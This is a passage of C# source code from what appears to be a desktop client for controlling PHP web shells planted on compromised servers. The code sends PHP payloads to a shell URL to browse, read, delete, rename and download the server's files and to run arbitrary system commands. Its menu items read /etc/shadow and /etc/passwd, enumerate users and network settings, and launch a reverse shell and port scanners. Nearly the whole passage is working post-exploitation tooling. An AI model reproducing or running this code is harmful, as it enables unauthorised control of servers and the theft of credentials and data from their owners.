            bool encryptResponse = shell.responseEncryption;
            int responseEncryptionMode = shell.responseEncryptionMode;
            string phpVersion = shell.PHP_VERSION;

            string[] paths = txtBoxFileBrowserPath.Text.Split('/');
            string lastPathRemoved = string.Join("/", paths, 0, paths.Count() - 1);

            if (string.IsNullOrEmpty(lastPathRemoved)) {
                lastPathRemoved = "/";
            }

            string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(lastPathRemoved, phpVersion, encryptResponse);
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);

            Shells[shellUrl].files.Nodes.Clear();

            if (g_SelectedShellUrl == shellUrl) {
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();

                txtBoxFileBrowserPath.Text = lastPathRemoved;

                if (!string.IsNullOrEmpty(response.Result)) {
                    string result = response.Result;
                    if (encryptResponse) {
                        result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                    }
                    if (!string.IsNullOrEmpty(result)) {
                        FileBrowserRender(result, shellUrl);
                    } else {
                        //todo level 3 logging
                    }
                } else {
                    //todo level 3 logging
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string phpVersion = Shells[shellUrl].PHP_VERSION;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            TreeNode tn = treeViewFileBrowser.SelectedNode;

            if (tn != null && tn.Nodes.Count == 0) {
                string path = tn.FullPath.Replace('\\', '/');

                if (path.Contains("..")) {
                    FilebrowserGoBack();
                } else {
                    string fullPath = string.Empty;
                    if (Shells[shellUrl].IsWindows) {
                        fullPath = path;
                    } else {
                        fullPath = txtBoxFileBrowserPath.Text + "/" + path;
                    }

                    string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(fullPath, phpVersion, encryptResponse);
                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);

                    if (string.IsNullOrEmpty(response.Result) == false) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                        }

                        if (string.IsNullOrEmpty(result)) {
                            MessageBox.Show("Error Decoding Response", "Whoops!!!!");
                            return;
                        }
                        string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

                        if (rows.Length > 0 && rows != null) {
                            foreach (string row in rows) {
                                string[] columns = row.Split(new string[] { PhpHelper.g_delimiter }, StringSplitOptions.None);

                                if (columns != null && columns.Length - 2 > 0) {

                                    string permissionOctal = Convert.ToString(Convert.ToInt32(columns[4]), 8);
                                    string perms = permissionOctal.Substring(permissionOctal.Length - 4);

                                    if (columns[columns.Length - 2] == "dir") {
                                        if (shellUrl == g_SelectedShellUrl) {
                                            TreeNode lastTn = tn.Nodes.Add(string.Empty, columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false) {
                                                lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            } else {
                                                lastTn.ToolTipText = perms;
                                            }
                                        } else {
                                            //TODO update their client cache here user changed clients
                                        }
                                    } else {
                                        if (shellUrl == g_SelectedShellUrl) {
                                            TreeNode lastTn = tn.Nodes.Add(string.Empty, columns[0], 6);
                                            if (string.IsNullOrEmpty(columns[2]) == false) {
                                                lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                            } else {
                                                lastTn.ToolTipText = perms;
                                            }
                                        } else {
                                            //TODO update their client cache here user changed clients
                                        }
                                    }
                                } else {
                                    //MessageBox.Show(columns[0]);
                                }
                            }
                            tn.Expand();
                            treeViewFileBrowser.Sort();
                        }
                    } else {
                        //todo level 3 logging
                    }
                }
            }
        }

        /// <summary>
        /// Override Prevents the filebrowser icon from being changed when selected
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeViewFileBrowser.SelectedImageIndex = e.Node.ImageIndex;
        }

        /// <summary>
        /// Hard re-fresh the filebrowser and start over at the (root) directory.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserRefresh_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            if (treeViewFileBrowser.Nodes != null
             && treeViewFileBrowser.Nodes.Count > 0) {
                if (Shells[g_SelectedShellUrl].files != null) {
                    Shells[g_SelectedShellUrl].files.Nodes.Clear();
                }
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }
            StartFileBrowser();
        }

        /// <summary>
        /// Updates selected node on right click to ensure that we have the correct node selected whenever 
        /// we preform context menu stip events on the filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.Node != null) {
                treeViewFileBrowser.SelectedNode = e.Node;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        private string fileBrowserGetFileName()
        {
            return treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        private string fileBrowserGetFileNameAndPath()
        {
            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            return txtBoxFileBrowserPath.Text.TrimEnd('/', '\\') + "/" + fileName;
        }

        /// <summary>
        //
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encrypt = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string name = fileBrowserGetFileNameAndPath();
            string phpCode = PhpHelper.ReadFile(name, encrypt);
        
            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Viewing File -" + name, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// Renames a file using the name input from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string fileName = fileBrowserGetFileNameAndPath();
            bool encryptResponse = Shells[shellUrl].responseEncryption;

            string newFileName = GuiHelper.RenameFileDialog(fileName, "Renaming File");

            if (!string.IsNullOrEmpty(newFileName)) {
                string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";

                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
            }
        }

        /// <summary>
        /// Deletes a file after displaying a warning prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string path = fileBrowserGetFileNameAndPath();
            bool encryptResponse = Shells[shellUrl].responseEncryption;

            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", 
                                                        "HOLD ON THERE COWBOY", 
                                                         MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes) {
                string phpCode = "@unlink('" + path + "');";
                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
            }
        }

        /// <summary>
        /// Creates a copy of the selected file using the name from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string fileName = fileBrowserGetFileNameAndPath();
            string newFileName = GuiHelper.RenameFileDialog(fileName, "Copying File");

            if (!string.IsNullOrEmpty(newFileName)) {
                string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
            }
        }

        /// <summary>
        /// Scrolls to the end of the Console Output Richtext box on update
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void richTextBoxConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            richTextBoxConsoleOutput.SelectionStart = richTextBoxConsoleOutput.Text.Length;
            richTextBoxConsoleOutput.ScrollToCaret();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void proxySettingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProxyOptions proxyOptions = ProxyOptions.getInstance();
            proxyOptions.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyShellURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(g_SelectedShellUrl);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnConsoleGoClick_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(textBoxConsoleInput.Text)) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string cmd = textBoxConsoleInput.Text;
            string phpCode = PhpHelper.ExecuteSystemCode(textBoxConsoleInput.Text, encryptResponse);

            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(shellUrl, phpCode));

            if (string.IsNullOrEmpty(response.Result) == false) {
                string result = response.Result;
                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\nNo Data Returned\r\n";
                    textBoxConsoleInput.Text = string.Empty;
                    return;
                }
                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\n" + result + "\r\n";
                textBoxConsoleInput.Text = string.Empty;
            } else {
                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\nNo Data Returned\r\n";
                textBoxConsoleInput.Text = string.Empty;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string fileName = fileBrowserGetFileName();
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            SaveFileDialog downloadFileDialog = new SaveFileDialog {
                RestoreDirectory = true
            };

            if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
                if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
                    //todo move phpcode
                    string phpCode = "@$result = @base64_encode(@file_get_contents('" + fileName + "'));";
                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);

                    if (string.IsNullOrEmpty(response.Result) == false) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                        }
                        byte[] fileBytes = Helper.DecodeBase64(result);
                        File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void portScannerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PortScanner ps = new PortScanner(g_SelectedShellUrl);
            ps.ShowDialog();
        }

        private void portScannerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            DistributedPortScanner ds = new DistributedPortScanner();
            ds.ShowDialog();
        }

        private void textBoxMaxCommentLength_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }

        private void toolStripMenuItemReverseShell_Click(object sender, EventArgs e)
        {
            ReverseShell reverseShellForm = new ReverseShell(g_SelectedShellUrl);
            reverseShellForm.ShowDialog();
        }

        #endregion

        #region OS_COMMANDS

        /// <summary>
        /// Shows process list inside of a read-only richtext editor
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool isWin = Shells[shellUrl].IsWindows;
            bool encrypt = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string cmd = PhpHelper.TaskListFunction(isWin);
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }
       
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetuserMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.windowsOS_NetUser;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.windowsOS_NetAccounts;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.windowsOS_Ipconfig;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.windowsOS_Ver;
            bool encrypt = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            ShellInfo shell = Shells[shellUrl];

            string cmd = PhpHelper.posixOS_Whoami;
            string phpCode = PhpHelper.ExecuteSystemCode(cmd, shell.responseEncryption);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, shell.responseEncryption, shell.responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            string cmd = PhpHelper.linuxOS_Ifconfig;
            bool encrypt = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
        }

        #endregion

        #region READ_COMMON_FILES
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsTargetsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string phpCode = PhpHelper.ReadFile(PhpHelper.windowsFS_hostTargets, encryptResponse);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.windowsFS_hostTargets, encryptResponse, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_NetworkInterfaces, encryptResponse);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_NetworkInterfaces, encryptResponse, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linusVersionMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ProcVersion, encryptResponse);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ProcVersion, encryptResponse, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxhostsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_hostTargetsFile, encryptResponse);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_hostTargetsFile, encryptResponse, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_IssueFile, encryptResponse);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_IssueFile, encryptResponse, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void shadowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ShadowFile, encryptResponse);

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ShadowFile, encryptResponse, responseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_PasswdFile, Shells[shellUrl].responseEncryption);
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_PasswdFile, encryptResponse, responseEncryptionMode);
        }

        #endregion

        private void optionsToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            Options optionsForm = new Options();
            optionsForm.ShowDialog();
        }
    }
}
